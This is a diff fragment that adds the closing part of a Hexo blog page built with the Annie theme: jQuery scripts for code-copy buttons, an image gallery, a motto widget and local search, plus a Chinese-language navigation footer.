+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
